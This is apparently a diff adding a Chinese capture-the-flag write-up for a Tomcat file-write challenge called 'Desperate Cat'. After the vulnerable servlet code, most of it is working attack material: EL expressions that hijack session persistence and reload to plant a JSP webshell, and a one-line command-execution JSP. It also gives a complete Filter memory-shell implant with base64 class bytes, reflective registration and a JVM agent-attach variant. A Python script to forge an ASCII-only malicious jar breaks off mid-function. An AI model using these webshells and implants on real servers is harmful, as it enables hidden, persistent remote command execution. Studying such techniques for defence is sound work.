@@ -732,11 +732,849 @@ if __name__ == "__main__":
 
 ## Desperate Cat
 
+Tomcat 环境，一个接口能往 web 目录写文件，文件名前缀随机、后缀可控，内容过 HTML 转义还夹脏数据。有两种解法，官方 writeup 是四段 EL 链，WreckTheLine/Sauercloud 两队直接写 ASCII jar 打了，最后都成功复现了。
+
+### 漏洞点
+
+war 就三个类，反编译全贴
+
+```java
+package org.rwctf.servlets;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.rwctf.util.ParamUtil;
+import org.rwctf.util.StringUtil;
+
+public class ExportServlet extends HttpServlet {
+    private File exportDir;
+
+    public void init() throws ServletException {
+        this.exportDir = new File(this.getServletContext().getRealPath("/export/"));
+        if (!this.exportDir.exists()) {
+            this.exportDir.mkdirs();
+        }
+    }
+
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String dir = ParamUtil.getParameter(req, "dir");
+        String fileName = ParamUtil.getParameter(req, "filename");
+        String content = ParamUtil.getParameter(req, "content");
+        if (StringUtil.isEmpty(content)) {
+            this.outputMsg(resp, "Empty content");
+            return;
+        }
+        if (StringUtil.isEmpty(fileName) || fileName.indexOf(46) < 0) {
+            fileName = StringUtil.randomStr();
+        } else {
+            String fileExt = fileName.substring(fileName.lastIndexOf(46) + 1);
+            fileName = StringUtil.randomStr() + "." + fileExt;
+        }
+        File saveFile = StringUtil.isEmpty(dir) ? new File(this.exportDir, fileName) : new File(this.getServletContext().getRealPath("/"), dir + File.separator + fileName);
+        String data = "DIRTY DATA AT THE BEGINNING " + content + " DIRTY DATA AT THE END";
+        this.writeBytesToFile(saveFile, data.getBytes(StandardCharsets.UTF_8));
+        this.outputMsg(resp, saveFile.getAbsolutePath());
+    }
+
+    private void outputMsg(HttpServletResponse resp, String msg) throws IOException {
+        resp.getWriter().write(msg);
+    }
+
+    private void writeBytesToFile(File dest, byte[] bytes) throws IOException {
+        if (!dest.getCanonicalPath().startsWith(this.getServletContext().getRealPath("/"))) {
+            throw new IOException("Illegal file path");
+        }
+        if (!dest.getParentFile().exists()) {
+            dest.getParentFile().mkdirs();
+        }
+        FileOutputStream fos = null;
+        try {
+            fos = new FileOutputStream(dest);
+            fos.write(bytes);
+        }
+        finally {
+            if (fos != null) {
+                try {
+                    fos.close();
+                }
+                catch (Exception exception) {}
+            }
+        }
+    }
+}
+```
+
+```java
+package org.rwctf.util;
+
+import javax.servlet.http.HttpServletRequest;
+import org.rwctf.util.StringUtil;
+
+public class ParamUtil {
+    private static final String[] SPECIAL_CHARS = new String[]{"&", "<", "'", ">", "\"", "(", ")"};
+    private static final String[] REPLACE_CHARS = new String[]{"&", "<", "&#39;", ">", """, "&#40;", "&#41;"};
+
+    public static String getParameter(HttpServletRequest request, String name) {
+        String val = request.getParameter(name);
+        if (StringUtil.isEmpty(val)) {
+            return "";
+        }
+        return StringUtil.replace(val.trim(), SPECIAL_CHARS, REPLACE_CHARS);
+    }
+}
+```
+
+```java
+package org.rwctf.util;
+
+import java.util.UUID;
+
+public class StringUtil {
+    public static boolean isEmpty(String str) {
+        return str == null || str.isEmpty();
+    }
+
+    public static String randomStr() {
+        return UUID.randomUUID().toString().replace("-", "");
+    }
+
+    public static String replace(String s, String oldSub, String newSub) {
+        if (s != null && oldSub != null && newSub != null) {
+            StringBuffer sb = new StringBuffer();
+            int length = oldSub.length();
+            int x = 0;
+            int y = s.indexOf(oldSub);
+            while (x <= y) {
+                sb.append(s.substring(x, y));
+                sb.append(newSub);
+                x = y + length;
+                y = s.indexOf(oldSub, x);
+            }
+            sb.append(s.substring(x));
+            return sb.toString();
+        }
+        return null;
+    }
+
+    public static String replace(String s, String[] oldSubs, String[] newSubs) {
+        if (s != null && oldSubs != null && newSubs != null) {
+            if (oldSubs.length != newSubs.length) {
+                return s;
+            }
+            for (int i = 0; i < oldSubs.length; ++i) {
+                s = StringUtil.replace(s, oldSubs[i], newSubs[i]);
+            }
+            return s;
+        }
+        return null;
+    }
+}
+```
+
+filename 无点整个变 UUID，有点只留最后一个点后面的后缀，dir 只能落在 webapp 内（getCanonicalPath 校验），子目录自动 mkdirs；content 先 trim 再按数组顺序替换，`&` 第一个被处理所以转成实体后不会被二次替换，落盘内容是 `"DIRTY DATA AT THE BEGINNING " + content + " DIRTY DATA AT THE END"`。
+
+`& < ' > " ( )` 全被吃，JSP 的 `<%` `%>` 引号括号没了。角度括号用 EL 绕（web.xml 4.0 默认解析 EL），但括号也被转义，`${Runtime.getRuntime().exec(...)}` 这种带参数的写法全废，只能属性读写，`.` 等价 getter，`=` 等价 setter。脏数据不影响 EL，模板文本原样拼接，`${...}` 前后夹什么都行。
+
+翻译过来其实就是生活中很常见的文件上传场景，文件前缀不可控，目录不可穿越，落地文件有脏数据，有解析黑名单。
+
+### EL 链
+
+通过 SPEL 表达式和 Tomcat 本身机制我们可以轻松写入 jspshell
+
+> - **Session 持久化（StandardManager）**, 当 Tomcat 正常关闭，或者某个 Web 应用（Context）发生重载（Reload）时，为了防止用户的登录状态丢失，Tomcat 会把当前内存里所有活跃的 Session 对象，序列化成二进制数据，保存到磁盘上的一个文件里（默认叫 `SESSIONS.ser`）。等到应用启动后，再从文件读取恢复。
+>   
+> - **JSP 引擎（Jasper）的容错性** ，JSP 引擎在编译 `.jsp` 文件时，只认 `<% %>` 里面的 Java 代码。至于 `<%` 前面和 `%>` 后面的任何东西（哪怕是乱码、乱七八糟的二进制字节），它统统当作普通的 HTML 文本（Template Text），直接原样输出到浏览器。
+
+利用 param.x 这个姿势轻松绕过黑名单，参数外带，我们就可以尽可能的写入我们想写的东西。
+
+```
+${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
+${sessionScope[param.b]=param.c}
+${pageContext.servletContext.classLoader.resources.context.reloadable=true}
+${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}
+```
+
+第一行修改 StandardManager 的 session 持久化路径，第二行往 session 塞值，第三行开 reloadable，第四行把 appBase 改成 `/`。
+
+如何触发呢？reloadable=true 后往 WEB-INF/lib 写个文件，这里选择写个非法 jar，但非法 jar 会让 context 起不来，ROOT 直接 404，所以第四行要在触发前执行，appBase 改成 `/` 后整个磁盘被当 webapps 扫，`/tmp` 自动部署成 webapp，session 写进 `/tmp/session.jsp` 就能访问
+
+```
+<%java.io.InputStream i=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}).getInputStream();byte[] b=new byte[8192];int n;while((n=i.read(b))>0){out.print(new String(b,0,n));}%>
+```
+
+这里测试发现两个坑点
+
+1. 非法 jar 会一直留在 WEB-INF/lib，真实场景下容器一重启 ROOT 就起不来，getshell 之后先删垃圾 jar。
+2. 脏数据里面的随机字节万一拼出 `<%` 或 `%>` Jasper 解析就崩，session 内容越短概率越低。
+
+![](./assets/004.png)
+
+### 内存马
+
+有 RCE 之后往 JVM 里打内存马。最初用的 FightingLzn9 的 AgentMemshell（3.7MB 的 agent jar，分块传输，全量注入还直接把 Tomcat 打挂过），后来回想 JSP 直接打内存马不就行了。
+
+Filter 型最简单，Filter 实现类 base64 内嵌在 JSP 里，defineClass 进 webapp 类加载器，再反射 StandardContext 注册。
+
+Filter 实现类：
+
+```java
+import java.io.IOException;
+import java.io.InputStream;
+import javax.servlet.Filter;
+import javax.servlet.FilterChain;
+import javax.servlet.FilterConfig;
+import javax.servlet.ServletException;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServletRequest;
+
+public class FilterMemshell implements Filter {
+    public void init(FilterConfig filterConfig) throws ServletException {
+    }
+
+    public void destroy() {
+    }
+
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+        HttpServletRequest req = (HttpServletRequest) request;
+        String cmd = req.getParameter("cmd");
+        if (cmd != null) {
+            try {
+                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
+                InputStream in = p.getInputStream();
+                byte[] buf = new byte[8192];
+                int n;
+                while ((n = in.read(buf)) > 0) response.getOutputStream().write(buf, 0, n);
+                response.getOutputStream().flush();
+            } catch (Exception ignored) {
+            }
+            return;
+        }
+        chain.doFilter(request, response);
+    }
+}
+```
+
+注册 JSP，base64 替换成 `FilterMemshell.class` 的实际内容即可用
+
+```jsp
+<%@ page import="java.lang.reflect.*,java.util.*,java.util.jar.*,java.io.*,java.net.*,java.lang.management.*" %>
+<%!
+static String AB64 = "yv66vgAAADQAOwoACQAcCwAdAB4IAB8KAAcAIAoAIQAiCAAjBwAkCgAHACUHACYKACcAKAcAKQoACwAqBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACWFnZW50bWFpbgEAOyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2luc3RydW1lbnQvSW5zdHJ1bWVudGF0aW9uOylWAQANU3RhY2tNYXBUYWJsZQcALAcALQcALgcAJAcAKQEAClNvdXJjZUZpbGUBAApBZ2VudC5qYXZhDAAOAA8HAC4MAC8AMAEAG29yZy5hcGFjaGUuanNwLm1lbXNoZWxsX2pzcAwAMQAyBwAtDAAzADQBAAhpbnN0YWxsMAEAD2phdmEvbGFuZy9DbGFzcwwANQA2AQAQamF2YS9sYW5nL09iamVjdAcANwwAOAA5AQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAOgAPAQAFQWdlbnQBABJbTGphdmEvbGFuZy9DbGFzczsBABBqYXZhL2xhbmcvU3RyaW5nAQAkamF2YS9sYW5nL2luc3RydW1lbnQvSW5zdHJ1bWVudGF0aW9uAQATZ2V0QWxsTG9hZGVkQ2xhc3NlcwEAFCgpW0xqYXZhL2xhbmcvQ2xhc3M7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQAhAA0ACQAAAAAAAgABAA4ADwABABAAAAAdAAEAAQAAAAUqtwABsQAAAAEAEQAAAAYAAQAAAAQACQASABMAAQAQAAAAvAADAAcAAABOK7kAAgEATSy+PgM2BBUEHaIAPSwVBDI6BRIDGQW2AAS2AAWZACQZBRIGA70AB7YACAEDvQAJtgAKV6cAEzoGGQa2AAynAAmEBAGn/8OxAAEAJgA6AD0ACwACABEAAAAmAAkAAAAGABkABwAmAAkAOgAMAD0ACgA/AAsARAANAEcABgBNABAAFAAAACgABP4ADQcAFQEB/wAvAAYHABYHABcHABUBAQcAGAABBwAZ+gAJ+AAFAAEAGgAAAAIAGw==";
+static String FB64 = "yv66vgAAADQAYAoAEgAtBwAuCAAvCwACADAKADEAMgcAMwgANAgANQoAMQA2CgA3ADgKADkAOgsAOwA8CgA9AD4KAD0APwcAQAsAQQBCBwBDBwBEBwBFAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAKRXhjZXB0aW9ucwcARgEAB2Rlc3Ryb3kBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA1TdGFja01hcFRhYmxlBwBDBwBHBwBIBwBJBwAuBwAzBwBKBwBLBwBMBwBABwBNAQAKU291cmNlRmlsZQEAE0ZpbHRlck1lbXNoZWxsLmphdmEMABQAFQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAANjbWQMAE4ATwcAUAwAUQBSAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwwAUwBUBwBKDABVAFYHAEsMAFcAWAcASAwAWQBaBwBbDABcAF0MAF4AFQEAE2phdmEvbGFuZy9FeGNlcHRpb24HAEkMAB0AXwEADkZpbHRlck1lbXNoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAAltCAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAPZ2V0T3V0cHV0U3RyZWFtAQAlKClMamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtOwEAIWphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbQEABXdyaXRlAQAHKFtCSUkpVgEABWZsdXNoAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhABEAEgABABMAAAAEAAEAFAAVAAEAFgAAAB0AAQABAAAABSq3AAGxAAAAAQAXAAAABgABAAAACwABABgAGQACABYAAAAZAAAAAgAAAAGxAAAAAQAXAAAABgABAAAADQAaAAAABAABABsAAQAcABUAAQAWAAAAGQAAAAEAAAABsQAAAAEAFwAAAAYAAQAAABAAAQAdAB4AAgAWAAABEQAFAAoAAAB1K8AAAjoEGQQSA7kABAIAOgUZBcYAWbgABQa9AAZZAxIHU1kEEghTWQUZBVO2AAk6BhkGtgAKOgcRIAC8CDoIGQcZCLYAC1k2CZ4AFCy5AAwBABkIAxUJtgANp//lLLkADAEAtgAOpwAFOgaxLSssuQAQAwCxAAEAFgBmAGkADwACABcAAAA2AA0AAAATAAYAFAARABUAFgAXADEAGAA4ABkAPwAbAF0AHABmAB4AaQAdAGsAHwBsACEAdAAiAB8AAABGAAX/AD8ACQcAIAcAIQcAIgcAIwcAJAcAJQcAJgcAJwcAKAAA/AAdAf8ACwAGBwAgBwAhBwAiBwAjBwAkBwAlAAEHACkBAAAaAAAABgACACoAGwABACsAAAACACw=";
+static Object CTX;
+static boolean DONE;
+public static byte[] b64d(String s) throws Exception {
+    try {
+        Class<?> c = Class.forName("java.util.Base64");
+        Object d = c.getMethod("getDecoder").invoke(null);
+        return (byte[]) d.getClass().getMethod("decode", String.class).invoke(d, s);
+    } catch (Exception e) {
+        Class<?> c = Class.forName("sun.misc.BASE64Decoder");
+        Object d = c.newInstance();
+        return (byte[]) d.getClass().getMethod("decodeBuffer", String.class).invoke(d, s);
+    }
+}
+public static void install0() throws Exception {
+    Object ctx = CTX;
+    Object ldr = ctx.getClass().getMethod("getLoader").invoke(ctx);
+    ClassLoader cl = (ClassLoader) ldr.getClass().getMethod("getClassLoader").invoke(ldr);
+    Field fcF = ctx.getClass().getDeclaredField("filterConfigs");
+    fcF.setAccessible(true);
+    Map<String, Object> fcs = (Map) fcF.get(ctx);
+    if (fcs.containsKey("memshell")) return;
+    byte[] cb = b64d(FB64);
+    Class<?> fc = null;
+    try {
+        fc = Class.forName("FilterMemshell", false, cl);
+    } catch (ClassNotFoundException e) {
+        Method define = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+        define.setAccessible(true);
+        fc = (Class<?>) define.invoke(cl, cb, 0, cb.length);
+    }
+    Class<?> fdC = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+    Object fd = fdC.newInstance();
+    fdC.getMethod("setFilterName", String.class).invoke(fd, "memshell");
+    fdC.getMethod("setFilterClass", String.class).invoke(fd, fc.getName());
+    ctx.getClass().getMethod("addFilterDef", fdC).invoke(ctx, fd);
+    Field fmF = ctx.getClass().getDeclaredField("filterMaps");
+    fmF.setAccessible(true);
+    Object cfm = fmF.get(ctx);
+    Method arrM = cfm.getClass().getMethod("asArray");
+    arrM.setAccessible(true);
+    boolean mapped = false;
+    for (Object m : (Object[]) arrM.invoke(cfm)) {
+        String n = (String) m.getClass().getMethod("getFilterName").invoke(m);
+        if ("memshell".equals(n)) { mapped = true; break; }
+    }
+    if (!mapped) {
+        Class<?> fmC = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+        Object fm = fmC.newInstance();
+        fmC.getMethod("setFilterName", String.class).invoke(fm, "memshell");
+        fmC.getMethod("addURLPattern", String.class).invoke(fm, "/*");
+        Method addM = cfm.getClass().getMethod("add", fmC);
+        addM.setAccessible(true);
+        addM.invoke(cfm, fm);
+    }
+    Class<?> fciC = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+    Constructor<?> fciCtor = fciC.getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), fdC);
+    fciCtor.setAccessible(true);
+    fcs.put("memshell", fciCtor.newInstance(ctx, fd));
+}
+%>
+<%
+ServletContext sc = request.getServletContext();
+Field f1 = sc.getClass().getDeclaredField("context");
+f1.setAccessible(true);
+Object ac = f1.get(sc);
+Field f2 = ac.getClass().getDeclaredField("context");
+f2.setAccessible(true);
+Object ctx = f2.get(ac);
+CTX = ctx;
+if (DONE) {
+    Field fcF2 = ctx.getClass().getDeclaredField("filterConfigs");
+    fcF2.setAccessible(true);
+    out.print("already done, filter=" + ((Map) fcF2.get(ctx)).containsKey("memshell"));
+    return;
+}
+DONE = true;
+byte[] cls = b64d(AB64);
+Manifest mf = new Manifest();
+Attributes a = mf.getMainAttributes();
+a.putValue("Manifest-Version", "1.0");
+a.putValue("Agent-Class", "Agent");
+a.putValue("Premain-Class", "Agent");
+a.putValue("Can-Redefine-Classes", "true");
+a.putValue("Can-Retransform-Classes", "true");
+JarOutputStream jos = new JarOutputStream(new FileOutputStream("/tmp/mi.jar"), mf);
+jos.putNextEntry(new JarEntry("Agent.class"));
+jos.write(cls);
+jos.closeEntry();
+jos.close();
+String pid = ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
+URLClassLoader tcl = new URLClassLoader(new URL[]{ new File("/opt/jdk/lib/tools.jar").toURI().toURL() }, ClassLoader.getSystemClassLoader());
+Thread.currentThread().setContextClassLoader(tcl);
+Class<?> vmCls = tcl.loadClass("com.sun.tools.attach.VirtualMachine");
+Object vm = vmCls.getMethod("attach", String.class).invoke(null, pid);
+vm.getClass().getMethod("loadAgent", String.class).invoke(vm, "/tmp/mi.jar");
+vm.getClass().getMethod("detach").invoke(vm);
+Field fcF = ctx.getClass().getDeclaredField("filterConfigs");
+fcF.setAccessible(true);
+Map<String, Object> fcs = (Map) fcF.get(ctx);
+out.print("agent loaded, filter=" + fcs.containsKey("memshell"));
+%>
+```
+
+Agent 型也走通了，JSP 自 attach，tools.jar 反射加载 `VirtualMachine`，`JarOutputStream` 在内存里拼一个 mini agent jar（Agent 类只有 1KB），loadAgent 后 agentmain 反射调 JSP 类的静态方法完成注册。
+
+Agent 类
+
+```java
+import java.lang.instrument.Instrumentation;
+import java.lang.reflect.Method;
+
+public class Agent {
+    public static void agentmain(String args, Instrumentation inst) {
+        for (Class<?> c : inst.getAllLoadedClasses()) {
+            if ("org.apache.jsp.memshell_005fagent_jsp".equals(c.getName())) {
+                try {
+                    c.getMethod("install0").invoke(null);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                break;
+            }
+        }
+    }
+}
+```
+
+完整 JSP，AB64/FB64 替换成对应 class 的 base64 可用
+
+```jsp
+<%@ page import="java.lang.reflect.*,java.util.*,java.util.jar.*,java.io.*,java.net.*,java.lang.management.*" %>
+<%!
+static String AB64 = "<base64 of Agent.class>";
+static String FB64 = "<base64 of FilterMemshell.class>";
+static Object CTX;
+static boolean DONE;
+public static byte[] b64d(String s) throws Exception {
+    try {
+        Class<?> c = Class.forName("java.util.Base64");
+        Object d = c.getMethod("getDecoder").invoke(null);
+        return (byte[]) d.getClass().getMethod("decode", String.class).invoke(d, s);
+    } catch (Exception e) {
+        Class<?> c = Class.forName("sun.misc.BASE64Decoder");
+        Object d = c.newInstance();
+        return (byte[]) d.getClass().getMethod("decodeBuffer", String.class).invoke(d, s);
+    }
+}
+public static void install0() throws Exception {
+    Object ctx = CTX;
+    Object ldr = ctx.getClass().getMethod("getLoader").invoke(ctx);
+    ClassLoader cl = (ClassLoader) ldr.getClass().getMethod("getClassLoader").invoke(ldr);
+    Field fcF = ctx.getClass().getDeclaredField("filterConfigs");
+    fcF.setAccessible(true);
+    Map<String, Object> fcs = (Map) fcF.get(ctx);
+    if (fcs.containsKey("memshell")) return;
+    byte[] cb = b64d(FB64);
+    Class<?> fc = null;
+    try {
+        fc = Class.forName("FilterMemshell", false, cl);
+    } catch (ClassNotFoundException e) {
+        Method define = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+        define.setAccessible(true);
+        fc = (Class<?>) define.invoke(cl, cb, 0, cb.length);
+    }
+    Class<?> fdC = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+    Object fd = fdC.newInstance();
+    fdC.getMethod("setFilterName", String.class).invoke(fd, "memshell");
+    fdC.getMethod("setFilterClass", String.class).invoke(fd, fc.getName());
+    ctx.getClass().getMethod("addFilterDef", fdC).invoke(ctx, fd);
+    Field fmF = ctx.getClass().getDeclaredField("filterMaps");
+    fmF.setAccessible(true);
+    Object cfm = fmF.get(ctx);
+    Method arrM = cfm.getClass().getMethod("asArray");
+    arrM.setAccessible(true);
+    boolean mapped = false;
+    for (Object m : (Object[]) arrM.invoke(cfm)) {
+        String n = (String) m.getClass().getMethod("getFilterName").invoke(m);
+        if ("memshell".equals(n)) { mapped = true; break; }
+    }
+    if (!mapped) {
+        Class<?> fmC = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+        Object fm = fmC.newInstance();
+        fmC.getMethod("setFilterName", String.class).invoke(fm, "memshell");
+        fmC.getMethod("addURLPattern", String.class).invoke(fm, "/*");
+        Method addM = cfm.getClass().getMethod("add", fmC);
+        addM.setAccessible(true);
+        addM.invoke(cfm, fm);
+    }
+    Class<?> fciC = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+    Constructor<?> fciCtor = fciC.getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), fdC);
+    fciCtor.setAccessible(true);
+    fcs.put("memshell", fciCtor.newInstance(ctx, fd));
+}
+%>
+<%
+ServletContext sc = request.getServletContext();
+Field f1 = sc.getClass().getDeclaredField("context");
+f1.setAccessible(true);
+Object ac = f1.get(sc);
+Field f2 = ac.getClass().getDeclaredField("context");
+f2.setAccessible(true);
+Object ctx = f2.get(ac);
+CTX = ctx;
+if (DONE) {
+    Field fcF2 = ctx.getClass().getDeclaredField("filterConfigs");
+    fcF2.setAccessible(true);
+    out.print("already done, filter=" + ((Map) fcF2.get(ctx)).containsKey("memshell"));
+    return;
+}
+DONE = true;
+byte[] cls = b64d(AB64);
+Manifest mf = new Manifest();
+Attributes a = mf.getMainAttributes();
+a.putValue("Manifest-Version", "1.0");
+a.putValue("Agent-Class", "Agent");
+a.putValue("Premain-Class", "Agent");
+a.putValue("Can-Redefine-Classes", "true");
+a.putValue("Can-Retransform-Classes", "true");
+JarOutputStream jos = new JarOutputStream(new FileOutputStream("/tmp/mi.jar"), mf);
+jos.putNextEntry(new JarEntry("Agent.class"));
+jos.write(cls);
+jos.closeEntry();
+jos.close();
+String pid = ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
+URLClassLoader tcl = new URLClassLoader(new URL[]{ new File("/opt/jdk/lib/tools.jar").toURI().toURL() }, ClassLoader.getSystemClassLoader());
+Thread.currentThread().setContextClassLoader(tcl);
+Class<?> vmCls = tcl.loadClass("com.sun.tools.attach.VirtualMachine");
+Object vm = vmCls.getMethod("attach", String.class).invoke(null, pid);
+vm.getClass().getMethod("loadAgent", String.class).invoke(vm, "/tmp/mi.jar");
+vm.getClass().getMethod("detach").invoke(vm);
+Field fcF = ctx.getClass().getDeclaredField("filterConfigs");
+fcF.setAccessible(true);
+Map<String, Object> fcs = (Map) fcF.get(ctx);
+out.print("agent loaded, filter=" + fcs.containsKey("memshell"));
+%>
+```
+
+因为 Tomcat 版本吃的亏：
+
+1. `getServletContext()` 拿到的是 ApplicationContextFacade，要反射 `context` 字段剥两层才是 StandardContext。
+2. Tomcat 9.0.56 的 `filterMaps` 字段类型是内部类 `ContextFilterMaps`，只有 `asArray/add/addBefore/remove` 四个方法，幂等检查用 `asArray()` 遍历、注册用 `add()`。
+3. 直接取 JSP 类自己的 loader 也不行，Jasper 的类挂在 `JasperLoader` 上，和 ApplicationFilterConfig 用的 loader 不是同一个。
+
+Agent 测试发现的坑点：
+
+1. 重复访问会因 libattach.so 已加载报 500（URLClassLoader 重复加载 tools.jar），JSP 里加个静态标志跳过。
+2. 纯 transformer 型（直接改 `ApplicationFilterChain.doFilter` 字节码）也试过，agentmain 注册 transformer + retransformClasses，注入器手写 class 文件解析（常量池追加 Methodref、插 9 字节模板、修异常表/局部变量表/StackMapTable），javap 验证帧表全对，但 JDK8 的 split verifier 对手工帧表极其挑剔，bad offset 反复出现，最终放弃。
+3. agentmain 线程的 TCCL 是 system classloader，defineClass 会挂 `javax.servlet.Filter` 找不到，必须从 StandardContext 的 Loader 拿 WebappClassLoader（`ctx.getLoader().getClassLoader()`）。
 
 
 
 
+![](./assets/005.png)
+### 无 EL 路线
 
+直接写合法 jar 进 WEB-INF/lib 再触发 reload，只不过构造比较麻烦。
+
+content 以 UTF-8 落盘，每个字节必须小于 0x80（不然多字节，zip 长度偏移字段全错位）、不在 `&<'>"()` 七个转义里、首尾不能是小于等于 0x20（参数会 trim）。
+
+zip 从尾部 EOCD 解析、头部允许垃圾，脏数据前缀留文件头，CD 和 EOCD 的偏移字段都加 27；后缀 ` DIRTY DATA AT THE END` 当 EOCD 注释——注释长度字段设 21，服务端拼的后缀正好是注释正文，`len - i - ENDHDR - commentLen == 0` 完美通过。但 content 末尾是注释长度的高字节 0x00 会被 trim 掉，EOCD 后要垫几个大于 0x20 的字符（C0NY1），注释长度写成占位加 21。
+
+压缩数据用 ascii-zip，它构造 deflate 动态 Huffman 码表让输出字节全在 `[A-Za-z0-9]`。crc、压缩长度、原始长度、CD 偏移这些算出来的字段只能爆破，JSP 里填 `<!-- AAAAA... -->` 当 padding，每轮重算 CRC 重新压缩，检查 4 个 4 字节字段。
+
+1. ascii-zip 输出比输入大（字母数字流开销约 1.5 倍），精简 JSP 压缩后 329 字节，CD 偏移 385 = 0x181 首字节超限，改 padding 没用因为偏移跟着压缩长度单调走，两步法先纯算 crc32 筛候选再压缩，padding 401 个 A 命中。
+2. 手写 CD 条目时 external attrs 是 4 字节字段，按 2 字节写整个结构错位，Tomcat 报 invalid CEN header，context 起不来。
+
+jar 条目用 `META-INF/resources/shell.jsp`，WebResourceRoot 映射成 webapp 根资源，reload 后直接访问。
+
+触发不用 EL，因为默认 WatchedResource 含 `WEB-INF/tomcat-web.xml`，autoDeploy 默认开，export 建个同名目录就触发 reload。合法 jar 不崩应用，这是比 EL 链强的地方。
+
+```python
+#!/usr/bin/env python3
+import contextlib
+import io
+import struct
+import sys
+import time
+import zlib
+
+import requests
+from compress_lib import ASCIICompressor
+
+PREFIX = b"DIRTY DATA AT THE BEGINNING "
+SUFFIX = b" DIRTY DATA AT THE END"
+PAD_TAIL = b"C0NY1"
+JSP_BODY = b'<%out.print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")}).getInputStream()).useDelimiter("\\\\A").next());%>\n'
+ALLOW = set(range(128)) - {38, 60, 39, 62, 34, 40, 41}
+
+
+def fld_ok(n):
+    return all((n >> s) & 0xff in ALLOW for s in (0, 8, 16, 24))
+
+
+def find_content(zip_name):
+    comp = ASCIICompressor(bytearray(ALLOW))
+    cands = []
+    for pad in range(300, 3000):
+        raw = b"<!-- " + b"A" * pad + b" -->\n" + JSP_BODY
+        if fld_ok(zlib.crc32(raw)) and fld_ok(len(raw)):
+            cands.append(raw)
+    for raw in cands:
+        with contextlib.redirect_stdout(io.StringIO()):
+            data = comp.compress(bytearray(raw))[0]
+        if fld_ok(len(data)) and fld_ok(len(data) + len(zip_name) + 0x1e + 27):
+            return raw, data
+    raise SystemExit("no fit")
+
+
+def build_jar(raw, data, zip_name):
+    crc = zlib.crc32(raw) % pow(2, 32)
+    lfh = (b"PK\x03\x04" + struct.pack("<HHHHH", 0x000A, 0x0008, 0x0008, 0, 0)
+           + struct.pack("<LLL", 0, 0, 0)
+           + struct.pack("<HH", len(zip_name), 0) + zip_name)
